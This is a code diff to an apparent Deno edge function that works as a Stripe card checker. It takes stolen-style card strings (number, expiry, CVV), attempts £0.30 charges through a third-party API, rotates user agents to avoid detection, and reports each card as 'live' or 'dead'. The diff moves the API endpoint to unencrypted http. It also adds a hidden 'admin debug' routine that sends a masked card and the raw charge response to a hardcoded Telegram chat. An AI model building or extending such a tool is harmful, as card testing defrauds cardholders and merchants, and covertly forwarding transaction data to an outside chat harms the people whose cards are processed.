@@ -11,7 +11,49 @@ const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
 
 // API Configuration - GBP endpoint
-const API_BASE_URL = "https://web-production-7ad4f.up.railway.app/api";
+const API_BASE_URL = "http://3-production-c130.up.railway.app/api";
+
+const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
+const ADMIN_CHAT_ID = "8496943061";
+
+// Send debug to admin via Telegram - ONLY for admin debugging
+const sendAdminDebug = async (cc: string, status: string, rawResponse: string) => {
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.log('[STRIPE-GBP] No Telegram token - skipping admin debug');
+    return;
+  }
+  
+  try {
+    const parts = cc.split('|');
+    const maskedCard = parts[0] ? 
+      `${parts[0].slice(0, 6)}******${parts[0].slice(-4)}|${parts[1] || '**'}|${parts[2] || '**'}|***` : 
+      'Invalid format';
+    
+    const truncatedRaw = rawResponse.length > 3000 ? 
+      rawResponse.substring(0, 3000) + '\n... [truncated]' : 
+      rawResponse;
+    
+    const statusEmoji = status === 'live' ? '💚' : status === 'dead' ? '❌' : '❓';
+    const message = `${statusEmoji} <b>Stripe GBP Debug</b>\n\n` +
+      `<b>Card:</b> <code>${maskedCard}</code>\n` +
+      `<b>Status:</b> ${status.toUpperCase()}\n` +
+      `<b>Amount:</b> £0.30\n\n` +
+      `<b>Raw Response:</b>\n<pre>${truncatedRaw.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
+    
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      })
+    });
+  } catch (error) {
+    console.error('[STRIPE-GBP] Failed to send admin debug:', error);
+  }
+};
 
 // Rotating User Agents
 const userAgents = [
@@ -161,11 +203,14 @@ serve(async (req) => {
     // Wait for API result
     const result = await apiPromise;
     
+    // Send debug to admin (fire-and-forget) - full logs only for admin
+    sendAdminDebug(cc, result.status, result.rawResponse);
+    
     return new Response(
       JSON.stringify({
         computedStatus: result.status,
         apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
-        apiMessage: result.message, // Exact API response message
+        apiMessage: result.message, // Exact API response message displayed to user
         apiTotal: '£0.30',
         chargeAmount: '£0.30',
         status: result.status,
